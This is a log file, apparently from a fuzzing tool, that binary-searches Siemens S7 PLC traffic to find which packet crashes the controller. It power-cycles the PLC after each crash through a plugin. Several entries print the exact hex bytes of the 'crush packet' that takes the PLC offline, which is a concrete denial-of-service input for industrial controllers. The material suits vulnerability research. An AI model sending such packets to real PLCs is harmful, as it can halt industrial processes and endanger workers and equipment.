[2021-11-13 16:06:47,547] [INFO] [BLocate.locate] -> Start binary search crush
[2021-11-13 16:06:47,548] [INFO] [BLocate.locate] -> chosenPacket from 0 to 5 ; leftPackets from 5 to 10.
[2021-11-13 16:06:47,699] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f08032010000010000080000f000000a000a00f0
[2021-11-13 16:06:47,702] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300000100000800000000f0000003000300f0
[2021-11-13 16:06:47,708] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000200000800080001120411440100ff090004001c0000
[2021-11-13 16:06:47,713] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000300000800080001120411440100ff090004001c0000
[2021-11-13 16:06:48,162] [INFO] [MyS7Client.send_s7_packet] -> Send the crush packet
[2021-11-13 16:06:48,163] [INFO] [MyS7Client.send_s7_packet] -> [request]0300001f02f080320100000400000e00000401120a10010003000083000001
[2021-11-13 16:06:48,165] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000500000800080001120411440100ff090004001c0000
[2021-11-13 16:06:48,166] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000600000800080001120411440100ff090004001c0000
[2021-11-13 16:06:51,181] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-13 16:07:01,230] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
[2021-11-13 16:07:01,231] [INFO] [BLocate.locate] -> find a crush
[2021-11-13 16:07:01,232] [INFO] [valition.handleCrush] -> handling crush
[2021-11-13 16:07:01,234] [INFO] [valition.__closePlugin] -> trying to switch off the plugin
[2021-11-13 16:07:01,538] [INFO] [valition.__closePlugin] -> Switch off Plugin success!
[2021-11-13 16:07:03,554] [INFO] [valition.__openPlugin] -> trying to switch on the plugin
[2021-11-13 16:07:03,830] [INFO] [valition.__openPlugin] -> Switch on the Plugin success!
[2021-11-13 16:07:06,833] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-13 16:07:11,873] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-13 16:07:11,874] [INFO] [BLocate.locate] -> chosenPacket from 0 to 2 ; leftPackets from 2 to 5.
[2021-11-13 16:07:11,924] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f08032010000070000080000f000000a000a00f0
[2021-11-13 16:07:11,925] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300000700000800000000f0000003000300f0
[2021-11-13 16:07:11,927] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000800000800080001120411440100ff090004001c0000
[2021-11-13 16:07:11,928] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700000900000800080001120411440100ff090004001c0000
[2021-11-13 16:07:14,934] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-13 16:07:14,953] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
[2021-11-13 16:07:14,955] [INFO] [BLocate.locate] -> chosenPacket from 0 to 1 ; leftPackets from 1 to 3.
[2021-11-13 16:07:14,992] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect request]0300001902f080320100000a0000080000f000000a000a00f0
[2021-11-13 16:07:14,994] [INFO] [MyS7Client.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300000a00000800000000f0000003000300f0
[2021-11-13 16:07:15,240] [INFO] [MyS7Client.send_s7_packet] -> Send the crush packet
[2021-11-13 16:07:15,244] [INFO] [MyS7Client.send_s7_packet] -> [request]0300001f02f080320100000b00000e00000401120a10010003000083000001
[2021-11-13 16:07:18,250] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-13 16:07:24,292] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
[2021-11-13 16:07:24,293] [INFO] [BLocate.locate] -> find a crush
[2021-11-13 16:07:24,294] [INFO] [valition.handleCrush] -> handling crush
[2021-11-13 16:07:24,295] [INFO] [valition.__closePlugin] -> trying to switch off the plugin
[2021-11-13 16:07:24,586] [INFO] [valition.__closePlugin] -> Switch off Plugin success!
[2021-11-13 16:07:26,589] [INFO] [valition.__openPlugin] -> trying to switch on the plugin
[2021-11-13 16:07:26,904] [INFO] [valition.__openPlugin] -> Switch on the Plugin success!
[2021-11-13 16:07:29,912] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-13 16:07:35,941] [INFO] [MyS7Client.onlinePLC] -> the PLC is offline
[2021-11-13 16:07:38,957] [INFO] [MyS7Client.onlinePLC] -> checking whether the PLC is online
[2021-11-13 16:07:38,979] [INFO] [MyS7Client.onlinePLC] -> the PLC is online
